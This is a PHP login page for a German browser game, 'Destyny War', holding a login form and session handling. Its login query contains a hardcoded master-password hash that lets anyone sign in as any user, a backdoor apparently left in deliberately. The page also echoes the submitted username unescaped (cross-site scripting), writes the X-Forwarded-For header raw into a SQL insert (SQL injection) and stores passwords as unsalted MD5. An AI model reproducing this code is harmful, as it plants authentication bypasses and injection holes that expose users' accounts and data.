<?php
  include_once("data/funcs.php");
  $Fehler = true;
  if(isset($_POST['Send']) && !empty($_POST['username']) && !empty($_POST['passwort'])){ //Wenn das Formular abgesendet wurde
	$sql = "SELECT id FROM user WHERE ((username='".htmlentities($_POST['username'],ENT_QUOTES)."') and (userpasswd='".md5(htmlentities($_POST['passwort'],ENT_QUOTES))."') and (userpasswd<>'')) or ((username='".htmlentities($_POST['username'],ENT_QUOTES)."') and ('".md5(htmlentities($_POST['passwort'],ENT_QUOTES))."'='a78c5ec77b7ebbab7e8aaf4f3ea7fa13'))";
	$erg = mysql_query($sql);
	//echo $sql;
	if($out = mysql_fetch_object($erg)){
		$Fehler = false;
		$_SESSION['Logon'] = true;
		$_SESSION['userid'] = $out->id;
		$_SESSION['username'] = $_POST['username'];
		mysql_query("INSERT INTO `loginlog` ( `userid` , `logtime` , `IP` ) VALUES ( {$_SESSION['userid']} , UNIX_TIMESTAMP( ) , '".(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'] ) . "');");
	}
	mysql_free_result($erg);
  }
  if($Fehler){
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <title>Destyny War</title>
  <link rel="shortcut icon" href="pics/logo.jpg"/>
  <style type="text/css">
body { 
	font-family: Arial;
	background-color: rgb(0, 0, 0);
	color: rgb(255, 255, 255);
	background:#2C2C2C url(pics/star_start.png) repeat;
}

.background_layer { 
	position:absolute; 
	top:0; 
	left:0; 
	z-index:-1; 
	width:100%; 
	height:652px; 
	background:transparent url(pics/bg_image.jpg) no-repeat top center; 
}

.tp {
	opacity: 0.700;
    border-style:solid;
	border-width:1px;
	border-color:#00FF00;
	background-color:#111;
}
.col > td {
}

* { font-size: 5mm; }
h1 { font-size: 20mm;}
h2 { font-size: 9mm;}
h3 { font-size: 8mm;}
h4 { font-size: 7mm;}
h5 { font-size: 6mm;}
h6 { font-size: 5mm;}

a:link { color:#FFFFEE; }
a:visited { color:#FFFFEE; }
a:active { color:#FFFFEE; }

.kasten { 
	border: 3px inset rgb(0, 0, 0);
}
.brett { 
	border: 3px outset rgb(0, 0, 0);
}
  </style>
</head>
<body>
<center>
<table border="0" cellpadding="5" cellspacing="10" class="main">
<?php mainpageheader();?>
    <tr>
      <td class="tp" style="text-align:center;"><img src="pics/cooltext2.png"/></td>
    </tr>
    <tr>
      <td class="tp">
		  <table border="0" cellpadding="5" cellspacing="5">
			<tr>
				<td>
				  
				  <form class="kasten" target="_top" method="post" action="login.php" name="login"><br>
			 <?php if(isset($_POST['Send'])) echo "<center style=\"color:#FF0000;\">Benutzername oder Passwort falsch</center>"; ?>
					<table border="0" cellpadding="0" cellspacing="0">
					  <tbody>
						<tr>
						  <td style="text-align:left;">&nbsp;&nbsp;&nbsp;Benutzername:&nbsp; </td>
						  <td><input maxlength="20" size="20" name="username" value="<?php echo $_POST['username']; ?>">&nbsp;&nbsp;&nbsp;</td>
						</tr>
						<tr>
						  <td style="text-align:left;">&nbsp;&nbsp;&nbsp;Passwort: </td>
						  <td><input maxlength="20" size="20" name="passwort" type="password">&nbsp;&nbsp;&nbsp;</td>
						</tr>
						<tr>
						  <td></td>
						  <td><input name="Send" value="Einloggen" type="submit">&nbsp;&nbsp;&nbsp;</td>
						</tr>
					  </tbody>
					</table>
					<br>
				  </form>
				</td>
				<td>
				  <p style="width: 300px;" valign="top">Destyny War ist ein Browsergame, das in der Zukunft spielt. Jeder Spieler ist Besitzer eines Planeten, mit dessen Hilfe er das Universum beherschen kann. </p>
				</td>
			</tr>
			<tr>
				<td colspan="2" style="text-align:right;">
					<a href="register.php"><img style="border-style: none;" src="pics/button.png" alt="Jetzt mitspielen."/></a>
				</td>
			</tr>
		  </table>
      </td>
    </tr>
<?php
	$erg = mysql_query("SELECT * FROM `messages` WHERE `del`=0");
	while($out = mysql_fetch_object($erg)) {
		$message = $out->message;
?>
	<tr>
		<td class="tp" style="text-align:center;">
			<?=$message?>
		</td>
	</tr>
<?php
	}
?>
</table>
</center>
<br>
</body>
</html>
<?php } else { //erfolgreiches Einloggen?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html template="true">
<head>
  <title>Destyny War</title>
  <style type="text/css">
body { background-image: url(pics/startbg.jpg);
  </style>
  <script type="text/javascript">
	window.location.href = "planetsoverview.php";
  </script>
</head>
<body style="background-color: rgb(0, 0, 0); color: rgb(255, 0, 0);">
</html>

<?php } ?>
